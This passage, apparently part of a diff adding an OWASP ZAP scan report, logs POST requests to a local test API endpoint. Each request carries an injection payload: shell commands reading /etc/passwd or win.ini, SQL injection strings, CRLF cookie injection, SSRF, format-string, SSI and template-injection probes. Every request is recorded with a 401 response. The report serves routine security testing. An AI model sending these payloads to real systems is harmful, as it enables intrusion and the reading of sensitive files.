+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "27",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4570",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe\u0026cat \/etc\/passwd\u0026\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4736",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe\u0026type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2358",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe' AND '1'='1' -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2378",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe' AND '1'='2' -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2397",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe' OR '1'='1' -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2451",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe' UNION ALL select NULL -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2114",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4672",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe'\u0026cat \/etc\/passwd\u0026'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4821",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe'\u0026type %SYSTEMROOT%\\\\win.ini\u0026'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2214",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe'(\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2514",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe') UNION ALL select NULL -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4694",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe';cat \/etc\/passwd;'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4930",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe';get-help\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4870",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe'|type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2493",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe) UNION ALL select NULL -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2184",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe;\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4582",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe;cat \/etc\/passwd;\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4940",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe;get-help #\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4899",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe;get-help\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2476",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe\\\" UNION ALL select NULL -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2125",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4616",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe\\\"\u0026cat \/etc\/passwd\u0026\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4787",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe\\\"\u0026type %SYSTEMROOT%\\\\win.ini\u0026\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4639",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe\\\";cat \/etc\/passwd;\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4915",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe\\\";get-help\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4808",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe\\\"|type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4767",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"John Doe|type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9167",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"Set-cookie: Tamper=b280e3d3-7e75-4dae-b348-5e6ac7a47e90\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "1054",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"URL='http:\/\/576128121310197795.owasp.org'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8904",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"ZAP %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n\\n\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8861",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8876",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"ZAP%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s\\n\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2122",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6012",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"\\\"'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4020",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"\\\"+response.write(66,140*41,961)+\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9949",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"\\\"\/><xsl:value-of select=\\\"system-property('xsl:vendor')\\\"\/><!--\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "3867",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"\\\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var=\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "1787",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"\\\"><!--#EXEC cmd=\\\"dir \\\\\\\"--><\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "1739",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"\\\"><!--#EXEC cmd=\\\"ls \/\\\"--><\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6051",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"]]>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9255",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"any?\\nSet-cookie: Tamper=b280e3d3-7e75-4dae-b348-5e6ac7a47e90\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9197",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"any?\\r\\nSet-cookie: Tamper=b280e3d3-7e75-4dae-b348-5e6ac7a47e90\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9291",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"any?\\r\\nSet-cookie: Tamper=b280e3d3-7e75-4dae-b348-5e6ac7a47e90\\r\\n\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9227",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"any\\nSet-cookie: Tamper=b280e3d3-7e75-4dae-b348-5e6ac7a47e90\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9196",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"any\\r\\nSet-cookie: Tamper=b280e3d3-7e75-4dae-b348-5e6ac7a47e90\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9278",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"any\\r\\nSet-cookie: Tamper=b280e3d3-7e75-4dae-b348-5e6ac7a47e90\\r\\n\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8742",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"bUVjcsYZyueXJjcGKVjbFuTpmRkhLFJNElNuJJxtDmojehZxoqbYDTKiOXIJtEWDaaUkcHlfWneRRIoeKhLwdbFdlNPHIFkKfFtHIKuSybBrjWtOSukrBFlUymwmxXSywopATCdZnVKIoqoXrxAppyjZhPhwHvMCjlRwZhvofuYppmuQXHNGuxNUwIEAkawwPqvxhAiReZQENKSxtnWhAhmcZBFhnBjHULZXhkfgdwjHRDslEApGUYttZtjXecSdiNEMheAFonhruYYoQasSuQsHZJVEfCPcUeXBEojxndwAmYnauBYICjQMDuLfNHPaENKErihIMTnHadPWmFsVUlWpEwIXNSGEogwLlKHIIpbdVRtVsIhuDIjNoutAgCFYYotmqfUlXFIwfFfJHZWFkIgFCwZTEpcgAfDVUpLpIEQTglkjjmGMoLCjeyAgoMDJTZxmmKKtXmRSDBOchsDMAIvfiXZcdiDuYToMvSCehXZJvwsFqIpOqkGuoQFQKPU)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4535",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"cat \/etc\/passwd\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4878",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"get-help\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "1146",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"http:\/\/\\\\576128121310197795.owasp.org\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "239",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"http:\/\/www.google.com\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "185",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"http:\/\/www.google.com\/\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "257",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"http:\/\/www.google.com\/search?q=ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "206",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"http:\/\/www.google.com:80\/\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "279",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"http:\/\/www.google.com:80\/search?q=ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "1024",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"https:\/\/576128121310197795%2eowasp%2eorg\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "1015",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"https:\/\/576128121310197795.owasp.org\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "1067",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"https:\/\/576128121310197795.owasp.org\/?John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "1121",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"https:\/\/\\\\576128121310197795.owasp.org\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4050",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"response.write(66,140*41,961)\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9927",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"system-property('xsl:vendor')\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "4711",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "326",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"www.google.com\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "297",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"www.google.com\/\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "341",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"www.google.com\/search?q=ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "314",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"www.google.com:80\/\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "361",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"www.google.com:80\/search?q=ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6327",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"zj 2025*6591 zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6543",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"zj#set($x=4107*3473)${x}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6396",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"zj#{7581*9136}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6383",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"zj${7036*6903}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6521",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"zj<%=4354*5464%>zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6565",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"zj<p th:text=\\\"${8408*9583}\\\"><\/p>zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6425",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"zj{#7450*8647}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6355",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"zj{8861*5271}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6442",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"zj{@4057*5700}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6586",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"zj{@math key=\\\"3711\\\" method=\\\"multiply\\\" operand=\\\"2186\\\"\/}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6465",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"zj{{7687*3278}}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6597",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"zj{{97540|add:23250}}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6496",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"zj{{=7300*1885}}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6613",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
